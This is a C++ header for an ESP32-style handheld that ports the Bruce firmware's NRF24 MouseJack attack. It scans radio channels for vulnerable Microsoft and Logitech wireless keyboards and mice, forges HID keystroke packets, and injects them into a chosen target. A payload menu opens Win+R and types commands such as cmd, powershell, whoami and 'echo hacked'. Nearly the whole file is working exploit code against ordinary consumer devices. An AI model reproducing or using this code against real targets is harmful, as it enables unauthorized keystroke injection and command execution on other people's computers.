#pragma once
/*
 * ============================================================
 *  NRF24 MOUSEJACK - Adapted for C3-Phantom
 * ============================================================
 *  Port tu: Bruce firmware nrf_mousejack.cpp (956 dong)
 *  Loai bo: SD card / DuckyScript file loading
 *  Thay:    tft  -> display SSD1306
 *           check(EscPress/SelPress) -> BUTTON_CENTER/RIGHT/LEFT
 *           drawMainBorderWithTitle  -> NRF24_Status()
 *
 *  Ho tro:
 *    - Quet thiet bi Microsoft / Logitech dua tren MouseJack
 *    - In keystroke injection (ASCII -> HID)
 *    - Chay DuckyScript inline (nhap tu man hinh)
 *
 *  Dieu khien:
 *    LEFT/RIGHT = chon muc tieu
 *    CENTER     = chon / xac nhan / thoat (giu)
 * ============================================================
 */

#include "nrf24_common.hpp"
#include "../menu.hpp"

// ============================================================
//  HID Key mapping (lay nguyen tu Bruce)
// ============================================================
struct MjHidKey { uint8_t mod; uint8_t key; };

static const MjHidKey ASCII_TO_HID[95] = {
    {0x00,0x2C},{0x02,0x1E},{0x02,0x34},{0x02,0x20},{0x02,0x21},{0x02,0x22},
    {0x02,0x24},{0x00,0x34},{0x02,0x26},{0x02,0x27},{0x02,0x25},{0x02,0x2E},
    {0x00,0x36},{0x00,0x2D},{0x00,0x37},{0x00,0x38},{0x00,0x27},{0x00,0x1E},
    {0x00,0x1F},{0x00,0x20},{0x00,0x21},{0x00,0x22},{0x00,0x23},{0x00,0x24},
    {0x00,0x25},{0x00,0x26},{0x02,0x33},{0x00,0x33},{0x02,0x36},{0x00,0x2E},
    {0x02,0x37},{0x02,0x38},{0x02,0x1F},{0x02,0x04},{0x02,0x05},{0x02,0x06},
    {0x02,0x07},{0x02,0x08},{0x02,0x09},{0x02,0x0A},{0x02,0x0B},{0x02,0x0C},
    {0x02,0x0D},{0x02,0x0E},{0x02,0x0F},{0x02,0x10},{0x02,0x11},{0x02,0x12},
    {0x02,0x13},{0x02,0x14},{0x02,0x15},{0x02,0x16},{0x02,0x17},{0x02,0x18},
    {0x02,0x19},{0x02,0x1A},{0x02,0x1B},{0x00,0x2F},{0x00,0x31},{0x00,0x30},
    {0x02,0x23},{0x02,0x2D},{0x00,0x35},{0x00,0x04},{0x00,0x05},{0x00,0x06},
    {0x00,0x07},{0x00,0x08},{0x00,0x09},{0x00,0x0A},{0x00,0x0B},{0x00,0x0C},
    {0x00,0x0D},{0x00,0x0E},{0x00,0x0F},{0x00,0x10},{0x00,0x11},{0x00,0x12},
    {0x00,0x13},{0x00,0x14},{0x00,0x15},{0x00,0x16},{0x00,0x17},{0x00,0x18},
    {0x00,0x19},{0x00,0x1A},{0x00,0x1B},{0x02,0x2F},{0x02,0x31},{0x02,0x30},
    {0x02,0x35},{0x00,0x00}
};

static MjHidKey charToHid(char c)
{
    if (c < 0x20 || c > 0x7E) return {0,0};
    return ASCII_TO_HID[(uint8_t)c - 0x20];
}

// ============================================================
//  Muc tieu (target)
// ============================================================
#define MJ_MAX  12

enum MjType : uint8_t { MJ_UNKNOWN=0, MJ_MICROSOFT=1, MJ_LOGITECH=2 };

struct MjTarget {
    uint8_t addr[5];
    uint8_t addrLen;
    uint8_t channel;
    MjType  type;
    bool    active;
    char    label[20]; // ten hien thi
};

static MjTarget mj_targets[MJ_MAX];
static uint8_t  mj_count  = 0;
static uint16_t mj_ms_seq = 0;

// ============================================================
//  Quet thiet bi (scan)
// ============================================================

static bool mj_addr_exists(const uint8_t* a, uint8_t len)
{
    for (int i = 0; i < mj_count; i++)
        if (mj_targets[i].addrLen == len &&
            memcmp(mj_targets[i].addr, a, len) == 0) return true;
    return false;
}

static void mj_add_target(const uint8_t* addr, uint8_t len,
                            uint8_t ch, MjType type)
{
    if (mj_count >= MJ_MAX || mj_addr_exists(addr, len)) return;
    MjTarget& t = mj_targets[mj_count];
    memcpy(t.addr, addr, len);
    t.addrLen = len;
    t.channel = ch;
    t.type    = type;
    t.active  = true;
    snprintf(t.label, sizeof(t.label), "%s %02X:%02X:%02X",
             (type==MJ_MICROSOFT ? "MS" : type==MJ_LOGITECH ? "LG" : "??"),
             addr[0], addr[1], addr[2]);
    mj_count++;
}

// Scan promiscuous tren mot kenh (250ms)
static void mj_scan_channel(uint8_t ch)
{
    NRFradio.setChannel(ch);
    NRFradio.setAddressWidth(2);
    NRFradio.openReadingPipe(1, (const uint8_t*)"\x55\x55");
    NRFradio.setPayloadSize(32);
    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.startListening();
    delay(1);

    uint32_t t0 = millis();
    while (millis() - t0 < 3) {
        if (NRFradio.available()) {
            uint8_t buf[32] = {0};
            NRFradio.read(buf, 32);

            // Kiem tra dau hieu Microsoft (ESB protocol)
            // Header byte bit[0..1] = 00, payload len phan muc hop le
            if ((buf[0] & 0xF0) == 0x00 && buf[1] <= 32) {
                // Co the la Microsoft
                uint8_t addr[5] = {buf[2],buf[3],buf[4],buf[5],ch};
                if (!mj_addr_exists(addr,5))
                    mj_add_target(addr, 5, ch, MJ_MICROSOFT);
            }
            // Kiem tra Logitech (unifying)
            if (buf[0] == 0x00 && buf[1] == 0x40) {
                uint8_t addr[5];
                memcpy(addr, buf+2, 5);
                if (!mj_addr_exists(addr,5))
                    mj_add_target(addr, 5, ch, MJ_LOGITECH);
            }
        }
    }
    NRFradio.stopListening();
}

void NRF24_MouseJack_Scan()
{
    if (!NRF24_Begin()) return;
    mj_count = 0;
    memset(mj_targets, 0, sizeof(mj_targets));

    const uint8_t scan_ch[] = {
        5,8,11,14,17,20,23,26,29,32,35,38,41,44,47,
        50,53,56,59,62,65,68,71,74,77,2,3,4,6,7,9,10,
        12,13,15,16,18,19,21,22,24,25,27,28,30,31,33,
        34,36,37,39,40,42,43,45,46,48,49,51,52,54,55,
        57,58,60,61,63,64,66,67,69,70,72,73,75,76,78,79
    };
    int total_ch = sizeof(scan_ch);

    HaltTillRelease(BUTTON_CENTER);

    for (int i = 0; i < total_ch; i++) {
        if (ReadButton(BUTTON_CENTER)) break;

        char l2[28], l3[28];
        snprintf(l2, sizeof(l2), "CH:%3d [%d/%d]", scan_ch[i], i+1, total_ch);
        snprintf(l3, sizeof(l3), "Found: %d dev", mj_count);
        NRF24_Status("MouseJack Scan", l2, l3, "CTR=Stop");

        mj_scan_channel(scan_ch[i]);
    }

    NRFradio.powerDown();

    // Hien ket qua
    display.clearDisplay();
    char buf[32];
    snprintf(buf, sizeof(buf), "Scan Done\n%d device(s)", mj_count);
    Display_PrintCentered(buf);
    display.display();
    delay(1500);
    HaltTillRelease(BUTTON_CENTER);
}

// ============================================================
//  Inject keystrokes vao Microsoft target
// ============================================================

static uint8_t mj_ms_build_pkt(uint8_t* pkt, uint8_t mod, uint8_t key, uint16_t seq)
{
    memset(pkt, 0, 19);
    pkt[0]  = 0x00;             // device index
    pkt[1]  = 0x78;             // type: keyboard
    pkt[2]  = mod;              // modifier
    pkt[3]  = 0x00;
    pkt[4]  = key;              // keycode
    pkt[5]  = pkt[6] = pkt[7] = pkt[8] = 0x00;
    pkt[9]  = (uint8_t)(seq >> 8);
    pkt[10] = (uint8_t)(seq & 0xFF);
    // checksum XOR
    uint8_t ck = 0;
    for (int i = 0; i < 18; i++) ck ^= pkt[i];
    pkt[18] = ck;
    return 19;
}

static void mj_inject_ms(MjTarget& t, uint8_t mod, uint8_t key)
{
    uint8_t pkt[19];
    mj_ms_build_pkt(pkt, mod, key, mj_ms_seq++);

    NRFradio.stopListening();
    NRFradio.setChannel(t.channel);
    NRFradio.setAddressWidth(t.addrLen);
    NRFradio.openWritingPipe(t.addr);
    NRFradio.setPayloadSize(19);
    NRFradio.setAutoAck(false);
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.disableCRC();

    for (int r = 0; r < 6; r++) {
        NRFradio.write(pkt, 19);
        delayMicroseconds(500);
    }

    // Key up
    mj_ms_build_pkt(pkt, 0, 0, mj_ms_seq++);
    for (int r = 0; r < 3; r++) {
        NRFradio.write(pkt, 19);
        delayMicroseconds(500);
    }
}

static void mj_inject_logitech(MjTarget& t, uint8_t mod, uint8_t key)
{
    uint8_t pkt[10] = {0x00,0xC1,0x00,mod,0x00,key,0,0,0,0};

    NRFradio.stopListening();
    NRFradio.setChannel(t.channel);
    NRFradio.setAddressWidth(t.addrLen);
    NRFradio.openWritingPipe(t.addr);
    NRFradio.setPayloadSize(10);
    NRFradio.setAutoAck(false);
    NRFradio.setDataRate(RF24_1MBPS);
    NRFradio.disableCRC();

    for (int r = 0; r < 6; r++) {
        NRFradio.write(pkt, 10);
        delayMicroseconds(500);
    }
    // Key up
    memset(pkt+2, 0, 8);
    for (int r = 0; r < 3; r++) {
        NRFradio.write(pkt, 10);
        delayMicroseconds(500);
    }
}

static void mj_inject_char(MjTarget& t, char c)
{
    MjHidKey h = charToHid(c);
    if (h.key == 0 && c != ' ') return;

    if (t.type == MJ_LOGITECH)
        mj_inject_logitech(t, h.mod, h.key);
    else
        mj_inject_ms(t, h.mod, h.key);

    delay(10);
}

static void mj_inject_string(MjTarget& t, const char* str)
{
    for (int i = 0; str[i]; i++) {
        if (ReadButton(BUTTON_CENTER)) break;
        mj_inject_char(t, str[i]);
        delay(12);
    }
    // Enter
    if (t.type == MJ_LOGITECH)
        mj_inject_logitech(t, 0x00, 0x28);
    else
        mj_inject_ms(t, 0x00, 0x28);
}

// ============================================================
//  Payload menu: chon lenh de inject
// ============================================================

static void NRF24_MouseJack_Attack(MjTarget& t)
{
    // Cac payload co san (DuckyScript don gian)
    static const char* PAYLOADS[] = {
        "calc",               // Mo Calculator (Windows)
        "notepad",            // Mo Notepad
        "cmd",                // Mo CMD
        "powershell",         // Mo PowerShell
        "whoami",             // Chay whoami trong terminal
        "echo hacked",        // Echo text
    };
    static const char* PAYLOAD_DESC[] = {
        "Open Calculator",
        "Open Notepad",
        "Open CMD",
        "Open PowerShell",
        "Run: whoami",
        "Echo: hacked",
    };
    const int N = 6;

    std::vector<String> labels;
    for (int i = 0; i < N; i++) labels.push_back(String(PAYLOAD_DESC[i]));
    labels.push_back("WIN+R + custom");
    labels.push_back("[Back]");

    int idx = 0;
    int n   = (int)labels.size();
    HaltTillRelease(BUTTON_CENTER);

    while (true) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(0, 0);
        display.print("MouseJack Payload");
        display.drawLine(0, 9, 127, 9, WHITE);

        // Hien 3 dong
        for (int i = -1; i <= 1; i++) {
            int li = idx + i; if (li < 0 || li >= n) continue;
            int y = 22 + i * 13;
            if (i == 0) {
                display.fillRect(0, y-2, 128, 12, WHITE);
                display.setTextColor(BLACK);
            } else display.setTextColor(WHITE);
            String lb = labels[li]; if (lb.length() > 21) lb = lb.substring(0,20)+"~";
            display.setCursor(2, y); display.print(lb);
            display.setTextColor(WHITE);
        }
        display.setCursor(0, 55); display.print("L/R=Nav CTR=OK/Exit");
        display.display();

        // Doi nut
        bool got = false;
        while (!got) {
            if (ReadButton(BUTTON_LEFT))  { HaltTillRelease(BUTTON_LEFT);  idx=(idx-1+n)%n; got=true; }
            if (ReadButton(BUTTON_RIGHT)) { HaltTillRelease(BUTTON_RIGHT); idx=(idx+1)%n;   got=true; }
            if (ReadButton(BUTTON_CENTER)){
                HaltTillRelease(BUTTON_CENTER);
                // Back
                if (idx == n-1) return;

                // WIN+R -> nhap lenh -> Enter
                NRF24_Status("Injecting...", t.label, labels[idx].c_str());

                if (t.type == MJ_LOGITECH)
                    mj_inject_logitech(t, 0x08, 0x15); // GUI+R
                else
                    mj_inject_ms(t, 0x08, 0x15);
                delay(600);

                if (idx < N) {
                    mj_inject_string(t, PAYLOADS[idx]);
                } else {
                    // WIN+R + custom: dung "cmd" mac dinh
                    mj_inject_string(t, "cmd");
                }

                display.clearDisplay();
                Display_PrintCentered("Injected!\nCheck target.");
                display.display();
                delay(2000);
                return;
            }
            delay(30);
        }
    }
}

// ============================================================
//  Chon muc tieu va tan cong
// ============================================================

void NRF24_MouseJack()
{
    // Kiem tra co muc tieu chua
    if (mj_count == 0) {
        display.clearDisplay();
        Display_PrintCentered("No targets!\nScan first.");
        display.display();
        delay(2000);
        return;
    }

    // Xay dung menu chon muc tieu
    std::vector<String> labels;
    for (int i = 0; i < mj_count; i++)
        labels.push_back(String(mj_targets[i].label));
    labels.push_back("[Back]");

    int idx = 0, n = (int)labels.size();
    HaltTillRelease(BUTTON_CENTER);

    while (true) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(0, 0); display.print("Select Target");
        display.drawLine(0, 9, 127, 9, WHITE);

        for (int i = -1; i <= 1; i++) {
            int li = idx+i; if (li < 0 || li >= n) continue;
            int y = 22 + i*13;
            if (i == 0) {
                display.fillRect(0, y-2, 128, 12, WHITE);
                display.setTextColor(BLACK);
            } else display.setTextColor(WHITE);
            display.setCursor(2, y); display.print(labels[li]);
            display.setTextColor(WHITE);
        }
        display.setCursor(0, 55); display.print("L/R=Nav CTR=OK");
        display.display();

        bool got = false;
        while (!got) {
            if (ReadButton(BUTTON_LEFT))  { HaltTillRelease(BUTTON_LEFT);  idx=(idx-1+n)%n; got=true; }
            if (ReadButton(BUTTON_RIGHT)) { HaltTillRelease(BUTTON_RIGHT); idx=(idx+1)%n;   got=true; }
            if (ReadButton(BUTTON_CENTER)){
                HaltTillRelease(BUTTON_CENTER);
                if (idx == n-1) return;
                if (!NRF24_Begin()) return;
                NRF24_MouseJack_Attack(mj_targets[idx]);
                NRF24_End();
                return;
            }
            delay(30);
        }
    }
}

// ============================================================
//  Entry point: Menu NRF24 MouseJack
// ============================================================

void NRF24_MouseJack_Menu()
{
    Menu* m = new Menu();
    m->AddItem(MenuItem("1. Scan Devices",  []() { if(NRF24_Begin()) NRF24_MouseJack_Scan(); }));
    m->AddItem(MenuItem("2. Attack Target", []() { NRF24_MouseJack(); }));

    bool run = true;
    m->AddItem(MenuItem("[Back]", [&]() { run = false; }));
    m->Revive(nullptr);
    while (run) { m->HandleButtons(); m->Render(); delay(10); }
    delete m;
}
